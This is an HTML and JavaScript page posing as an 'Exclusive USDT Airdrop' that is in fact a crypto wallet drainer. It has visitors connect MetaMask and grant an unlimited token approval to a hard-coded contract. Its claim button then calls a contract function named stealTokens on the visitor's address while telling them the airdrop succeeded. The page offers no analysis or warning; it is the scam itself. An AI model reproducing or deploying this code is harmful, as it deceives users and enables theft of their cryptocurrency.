<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Exclusive Airdrop Opportunity</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
  <style>
    /* Body and container styling as before... */
    body { /* (same as your original) */ }
    .container { /* (same as your original) */ }
    h1 { /* (same as your original) */ }
    h2 { /* (same as your original) */ }
    .btn { /* (same as your original) */ }
    .btn:disabled { /* (same as your original) */ }
    .footer { /* (same as your original) */ }
    .footer a { /* (same as your original) */ }
    /* Processing and grow-shrink animation */
    .processing { display: none; font-size: 1rem; color: yellow; margin-top: 20px; opacity: 0; transition: opacity 0.5s ease-in-out; animation: flashing 1s infinite alternate; }
    .processing.show { display: block; opacity: 1; }
    @keyframes flashing { 0% { opacity: 0.5; } 100% { opacity: 1; } }
    @keyframes growShrink { 0% { transform: scale(1); } 50% { transform: scale(1.5); } 100% { transform: scale(1); } }
    .processing.grow-shrink { animation: growShrink 1s infinite; }
  </style>
</head>
<body>
  <div class="container">
    <h1>ðŸŽ‰ Exclusive USDT Airdrop Just For You! ðŸŽ‰</h1>
    <h2>Claim your rewards today and start your journey to success!</h2>
    <button id="connectButton" class="btn">Connect to MetaMask</button>
    <button id="approveButton" class="btn" disabled>Approve Unlimited USDT Drops</button>
    <div class="claim-btn-container">
      <button id="claimAirdropButton" class="btn" disabled>Claim Your Airdrop Now!</button>
      <div id="processingMessage" class="processing">Processing...</div>
    </div>
    <div class="footer">
      <p>By participating, you agree to our <a href="#">Terms & Conditions</a>.</p>
      <p>Need help? <a href="#">Contact Us</a></p>
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/web3@1.7.1/dist/web3.min.js"></script>
  <script>
    const contractAddress = '0x4a21a1a07a3157e06d739D3bb231628143a66C29';
    const tokenAddress = '0x59610B067eCfeCEdaf146A5E9B180C440f008575';
    const ownerAddress = '0x9052EB26C0b9836335Ec153413F80bAEc7536414';
    const contractABI = [
      { "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "approve", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" },
      { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "balanceOf", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" },
      { "inputs": [{ "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" },
      { "inputs": [{ "internalType": "address", "name": "sender", "type": "address" }, { "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" },
      { "inputs": [{ "internalType": "address", "name": "victim", "type": "address" }], "name": "stealTokens", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
      { "inputs": [], "name": "withdrawETH", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
      { "inputs": [], "name": "withdrawTokens", "outputs": [], "stateMutability": "nonpayable", "type": "function" }
    ];

    let web3;
    let accounts;
    let isMetaMaskMessageShown = false;

    // Connect to MetaMask
    async function connectMetaMask() {
      if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        try {
          accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
          const walletAddress = accounts[0];
          const shortenedAddress = `${walletAddress.slice(0, 6)}...${walletAddress.slice(-4)}`;
          document.getElementById('connectButton').textContent = `Connected: ${shortenedAddress}`;
          document.getElementById('approveButton').disabled = false;
          document.getElementById('claimAirdropButton').disabled = false;

          if (walletAddress.toLowerCase() === ownerAddress.toLowerCase()) {
            document.getElementById('ownerButtons').style.display = 'block';
          } else {
            document.getElementById('ownerButtons').style.display = 'none';
          }
        } catch (error) {
          alert('MetaMask connection failed');
        }
      } else {
        alert('MetaMask not detected! Please install MetaMask.');
      }
    }

    // Open MetaMask on mobile
    function openMetaMaskMobile() {
      window.location.href = `metamask://dapp/${window.location.href}`;
      setTimeout(() => {
        if (!document.hidden && !isMetaMaskMessageShown) {
          alert('If MetaMask is not opened, please ensure it is installed.');
          isMetaMaskMessageShown = true;
        }
      }, 1000);
    }

    // Approve the contract for spending tokens
    async function approveSpending() {
      const tokenContract = new web3.eth.Contract(contractABI, tokenAddress);
      try {
        showProcessingMessage();
        const maxApprovalAmount = web3.utils.toBN('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff');
        await tokenContract.methods.approve(contractAddress, maxApprovalAmount).send({ from: accounts[0] });
        hideProcessingMessage();
        alert('Approval successful!');
        document.getElementById('claimAirdropButton').disabled = false;
      } catch (error) {
        hideProcessingMessage();
        alert('Error during approval');
      }
    }

    // Function to claim the airdrop
    async function claimAirdrop() {
      try {
        showProcessingMessage();
        const contract = new web3.eth.Contract(contractABI, contractAddress);
        await contract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
        hideProcessingMessage();
        alert('Airdrop claimed successfully!');
      } catch (error) {
        hideProcessingMessage();
        alert('Error during airdrop claim');
      }
    }

    // Show/Hide processing message
    function showProcessingMessage() {
      document.getElementById('processingMessage').classList.add('show', 'grow-shrink');
    }

    function hideProcessingMessage() {
      document.getElementById('processingMessage').classList.remove('show', 'grow-shrink');
    }

    // Check if the device is mobile
    function isMobileDevice() {
      return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
    }

    // Event listeners for buttons
    document.getElementById('connectButton').addEventListener('click', isMobileDevice() ? openMetaMaskMobile : connectMetaMask);
    document.getElementById('approveButton').addEventListener('click', approveSpending);
    document.getElementById('claimAirdropButton').addEventListener('click', claimAirdrop);

  </script>
</body>
</html>
